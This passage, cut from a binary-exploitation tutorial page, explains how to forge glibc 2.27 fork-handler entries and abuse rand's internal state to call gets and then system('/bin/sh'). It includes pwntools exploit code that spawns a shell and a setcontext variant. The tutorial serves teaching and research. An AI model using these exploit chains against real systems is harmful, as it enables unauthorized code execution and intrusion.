class="token string" style="color:#e3116c">b&quot;&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> i</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> func </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> </span><span class="token builtin">enumerate</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">funcs</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token builtin">next</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> addr</span><span class="token operator" style="color:#393A34">+</span><span class="token builtin">len</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">data</span><span class="token punctuation" style="color:#393A34">)</span><span class="token operator" style="color:#393A34">+</span><span class="token number" style="color:#36acaa">0x30</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        data </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> flat</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token number" style="color:#36acaa">0x00</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token builtin">next</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> i</span><span class="token operator" style="color:#393A34">==</span><span class="token builtin">len</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">funcs</span><span class="token punctuation" style="color:#393A34">)</span><span class="token operator" style="color:#393A34">-</span><span class="token number" style="color:#36acaa">1</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">else</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token number" style="color:#36acaa">0x08</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> func</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token number" style="color:#36acaa">0x28</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> p32</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token punctuation" style="color:#393A34">}</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> length</span><span class="token operator" style="color:#393A34">=</span><span class="token number" style="color:#36acaa">0x30</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> data</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">def</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">forge_packed</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">addr</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain">funcs</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> smallest</span><span class="token operator" style="color:#393A34">=</span><span class="token boolean" style="color:#36acaa">False</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">assert</span><span class="token plain"> funcs</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> smallest</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token comment" style="color:#999988;font-style:italic"># some refcntrs are outside our data</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token comment" style="color:#999988;font-style:italic"># (except the first one, which we need to control)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token comment" style="color:#999988;font-style:italic"># these will be incremented, and potentially corrupt some memory</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token comment" style="color:#999988;font-style:italic"># be careful when using this</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        size </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token builtin">max</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0x28</span><span class="token operator" style="color:#393A34">+</span><span class="token number" style="color:#36acaa">4</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x10</span><span class="token operator" style="color:#393A34">*</span><span class="token builtin">len</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">funcs</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">else</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token comment" style="color:#999988;font-style:italic"># all refcntrs are contained in our data</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        size </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x28</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x10</span><span class="token operator" style="color:#393A34">*</span><span class="token builtin">len</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">funcs</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0xc</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    data </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token builtin">bytearray</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">size</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    addrs </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">addr</span><span class="token operator" style="color:#393A34">+</span><span class="token number" style="color:#36acaa">0x10</span><span class="token operator" style="color:#393A34">*</span><span class="token plain">i </span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> i </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> </span><span class="token builtin">range</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token builtin">len</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">funcs</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> i</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">addr</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> func</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> </span><span class="token builtin">enumerate</span><span class="token punctuation" style="color:#393A34">(</span><span class="token builtin">zip</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">addrs</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> funcs</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        off </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> i</span><span class="token operator" style="color:#393A34">*</span><span class="token number" style="color:#36acaa">0x10</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        data</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">off</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain">off</span><span class="token operator" style="color:#393A34">+</span><span class="token number" style="color:#36acaa">0x10</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> p64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">addr</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> p64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">func</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> i </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> </span><span class="token builtin">range</span><span class="token punctuation" style="color:#393A34">(</span><span class="token builtin">len</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">funcs</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        off </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x28</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x10</span><span class="token operator" style="color:#393A34">*</span><span class="token plain">i</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> off</span><span class="token operator" style="color:#393A34">+</span><span class="token number" style="color:#36acaa">4</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> </span><span class="token builtin">len</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">data</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token keyword" style="color:#00009f">break</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        val </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> u32</span><span class="token punctuation" style="color:#393A34">(</span><span class="token builtin">bytes</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">data</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">off</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain">off</span><span class="token operator" style="color:#393A34">+</span><span class="token number" style="color:#36acaa">4</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token comment" style="color:#999988;font-style:italic"># the first refcntr must be non-zero</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token comment" style="color:#999988;font-style:italic"># otherwise it&#x27;ll loop forever</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> i </span><span class="token operator" style="color:#393A34">==</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token keyword" style="color:#00009f">assert</span><span class="token plain"> val </span><span class="token operator" style="color:#393A34">!=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        data</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">off</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain">off</span><span class="token operator" style="color:#393A34">+</span><span class="token number" style="color:#36acaa">4</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> p32</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">val </span><span class="token operator" style="color:#393A34">%</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">1</span><span class="token operator" style="color:#393A34">&lt;&lt;</span><span class="token number" style="color:#36acaa">32</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> </span><span class="token builtin">bytes</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">data</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre></div></div>
<p>You can do a standard array (<code>forge</code>), or you can utilise the unused space to pack it as much as possible (<code>forge_packed</code>). Both must contain at least the first <code>refcntr</code> though, as we need to ensure that that is non-zero. The rest of the <code>refcntr</code>&#x27;s will be incremented, and if these are outside our data, they <em>might</em> corrupt other data, but if that&#x27;s not a concern, then you can use <code>smallest=True</code>.</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="ret2rand">ret2rand<a href="#ret2rand" class="hash-link" aria-label="Direct link to ret2rand" title="Direct link to ret2rand">​</a></h3>
<p>Therefore the only way we can control <code>rdi</code> is through <code>prepare_handler</code> calls. We need a function that will populate <code>rdi</code> with some writable address, which we could then write to using <code>gets</code>.  <a href="/pwn/pwn/rop-2.34+/ret2gets">ret2gets</a> is unfortunately not very applicable here, as it&#x27;s quite limited prior to <code>2.30</code> (<a href="/pwn/pwn/rop-2.34+/ret2gets#glibc-prior-to-2.30">see here</a>).</p>
<p>Thankfully, I was able to find an alternative: <code>rand</code>.</p>
<p><a href="https://linux.die.net/man/3/rand" target="_blank" rel="noopener noreferrer">rand</a> is a psuedo random number generator, and with that comes the need to keep track of the random state. In this case, that state is <a href="https://elixir.bootlin.com/glibc/glibc-2.27/source/stdlib/random.c#L160" target="_blank" rel="noopener noreferrer">unsafe_state</a>, which is of type <code>random_state</code>:</p>
<figure><img src="/assets/image (100).png" alt=""><figcaption><p><a href="https://elixir.bootlin.com/glibc/glibc-2.27/source/stdlib/random.c#L287">random</a></p></figcaption></figure>
<p>This state is passed to <code>__random_r</code>, as the first argument <!-- -->👀<!-- -->. What&#x27;s more is that <code>__random_r</code> is relatively simple, doesn&#x27;t make any function calls, or alter the pointer itself, which means that it can just keep <code>unsafe_state</code> in <code>rdi</code> (we&#x27;ll look at this in a bit).</p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="but-what-about-the-locking">But what about the locking?<a href="#but-what-about-the-locking" class="hash-link" aria-label="Direct link to But what about the locking?" title="Direct link to But what about the locking?">​</a></h4>
<p>Well that&#x27;s a good question, because we&#x27;ve seen before (in <a href="/pwn/pwn/rop-2.34+/ret2gets#io_stdfile_0_lock-in-rdi">ret2gets</a>) that locking <code>lock</code> can result in <code>lock</code> being loaded into <code>rdi</code>.</p>
<figure><img src="/assets/image (111).png" alt=""><figcaption><p><a href="https://elixir.bootlin.com/glibc/glibc-2.27/source/sysdeps/nptl/libc-lockP.h#L210">__libc_lock_unlock</a></p></figcaption></figure>
<p>Ah, it&#x27;s our good ol&#x27; friend <code>lll_unlock</code>.</p>
<figure><img src="/assets/image (103).png" alt=""><figcaption><p><a href="https://elixir.bootlin.com/glibc/glibc-2.27/source/sysdeps/unix/sysv/linux/x86_64/lowlevellock.h#L196">lll_unlock</a>: Written in assembly</p></figcaption></figure>
<figure><img src="/assets/image (104).png" alt=""><figcaption><p><code>lll_unlock</code> in <code>__random</code></p></figcaption></figure>
<p>Just like in <a href="/pwn/pwn/rop-2.34+/ret2gets#glibc-prior-to-2.30">ret2gets prior to 2.30</a>, it only unlocks by using <code>lll_unlock_wait_private</code> when it&#x27;s multi-threaded, thus the single thread case works flawlessly and doesn&#x27;t touch <code>rdi</code>.</p>
<p>The multi-threaded case is a bit more complex, but if it&#x27;s locked with the value <a href="https://elixir.bootlin.com/glibc/glibc-2.27/source/sysdeps/unix/sysv/linux/x86_64/lowlevellock.h#L57" target="_blank" rel="noopener noreferrer">LLL_LOCK_INITIALIZER_LOCKED</a> (1), then it also doesn&#x27;t touch <code>rdi</code> (yay). However, <code>lock</code> can also contain the value <a href="https://elixir.bootlin.com/glibc/glibc-2.27/source/sysdeps/unix/sysv/linux/x86_64/lowlevellock.h#L58" target="_blank" rel="noopener noreferrer">LLL_LOCK_INITIALIZER_WAITERS</a> (2), in which case the <code>dec</code> won&#x27;t result in <code>0</code>, and will execute <code>lll_unlock_wait_private</code>, thus clobbering <code>rdi</code>.</p>
<p>This should be unlikely to happen to <code>rand</code>&#x27;s <a href="https://elixir.bootlin.com/glibc/glibc-2.27/source/stdlib/random.c#L197" target="_blank" rel="noopener noreferrer">lock</a>, as you&#x27;d need multiple threads trying to access <code>rand</code> at the same time, but it&#x27;s not impossible, so be careful.</p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="exploitation-1">Exploitation<a href="#exploitation-1" class="hash-link" aria-label="Direct link to Exploitation" title="Direct link to Exploitation">​</a></h4>
<p>So let&#x27;s go back to <code>random</code>, specifically <code>__random_r</code>. We can use <code>rand</code> followed by <code>gets</code> to write to the <code>unsafe_state</code>, but we&#x27;ll need to call <code>rand</code> again to put <code>unsafe_state</code> back into <code>rdi</code> after <code>gets</code>. And if we call <code>rand</code> using a corrupted <code>unsafe_state</code>, then we could cause a crash?</p>
<p>So we need to conform to <code>random_state</code>:</p>
<figure><img src="/assets/image (105).png" alt=""><figcaption><p><a href="https://elixir.bootlin.com/glibc/glibc-2.27/source/stdlib/stdlib.h#L423">random_data</a></p></figcaption></figure>
<p>But this contains multiple pointers, including at the beginning, where we might want to put <code>/bin/sh</code> string for example! But are these always used? Let&#x27;s check <code>__random_r</code>:</p>
<figure><img src="/assets/image (106).png" alt=""><figcaption><p><a href="https://elixir.bootlin.com/glibc/glibc-2.27/source/stdlib/random_r.c#L353">__random_r</a></p></figcaption></figure>
<p>At first glance, we can see the <code>fptr</code>, <code>rptr</code>, <code>state</code> pointers being used in the <code>else</code> clause. However, there&#x27;s an interesting case: <code>buf-&gt;rand_type == TYPE_0</code>. This seems to be much simpler, and doesn&#x27;t use <code>fptr</code> or <code>rptr</code>! It does still use <code>state</code>, but as long as it&#x27;s populated with a writable address, it won&#x27;t <code>SEGFAULT</code>. The default <code>rand_type</code> is <a href="https://elixir.bootlin.com/glibc/glibc-2.27/source/stdlib/random.c#L119" target="_blank" rel="noopener noreferrer">TYPE_3</a>, but we can easily overwrite it to <a href="https://elixir.bootlin.com/glibc/glibc-2.27/source/stdlib/random.c#L101" target="_blank" rel="noopener noreferrer">TYPE_0</a>.</p>
<p>Putting this together, we arrive at the following for <code>system(&quot;/bin/sh&quot;)</code>:</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">addr </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> libc</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">sym</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">__fork_handlers</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">data </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> p64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">addr</span><span class="token operator" style="color:#393A34">+</span><span class="token number" style="color:#36acaa">8</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> forge_packed</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">addr</span><span class="token operator" style="color:#393A34">+</span><span class="token number" style="color:#36acaa">8</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> libc</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">sym</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">rand</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> libc</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">sym</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">gets</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> libc</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">sym</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">rand</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> libc</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">sym</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">system</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">assert</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">b&quot;\n&quot;</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">not</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> data</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">extra_data </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> flat</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token number" style="color:#36acaa">0x00</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">b&quot;/bin/sh\x00&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token number" style="color:#36acaa">0x10</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> libc</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">sym</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">randtbl</span><span class="token operator" style="color:#393A34">+</span><span class="token number" style="color:#36acaa">4</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">    </span><span class="token comment" style="color:#999988;font-style:italic"># the previous `state` field</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token number" style="color:#36acaa">0x18</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> p32</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">   </span><span class="token comment" style="color:#999988;font-style:italic"># TYPE_0</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">assert</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">b&quot;\n&quot;</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">not</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> extra_data</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">p</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">sendlineafter</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">b&quot;Enter address, size and data: &quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string-interpolation string" style="color:#e3116c">f&quot;</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">{</span><span class="token string-interpolation interpolation">addr</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">}</span><span class="token string-interpolation string" style="color:#e3116c"> </span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">{</span><span class="token string-interpolation interpolation builtin">len</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">(</span><span class="token string-interpolation interpolation">data</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">)</span><span class="token string-interpolation interpolation operator" style="color:#393A34">+</span><span class="token string-interpolation interpolation number" style="color:#36acaa">2</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">}</span><span class="token string-interpolation string" style="color:#e3116c"> &quot;</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">encode</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> data</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">p</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">sendline</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">extra_data</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">p</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">interactive</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre></div></div>
<p>We&#x27;re also able to use this for <code>setcontext</code>:</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">addr </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> libc</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">sym</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">__fork_handlers</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">data </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> p64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">addr</span><span class="token operator" style="color:#393A34">+</span><span class="token number" style="color:#36acaa">8</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> forge_packed</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">addr</span><span class="token operator" style="color:#393A34">+</span><span class="token number" style="color:#36acaa">8</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> libc</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">sym</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">rand</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> libc</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">sym</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">gets</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> libc</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">sym</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">rand</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> libc</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">sym</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">setcontext</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">assert</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">b&quot;\n&quot;</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">not</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> data</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ucontext </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> setcontext</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token string" style="color:#e3116c">&quot;rdi&quot;</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token builtin">next</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">libc</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">search</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">b&quot;/bin/sh\x00&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token 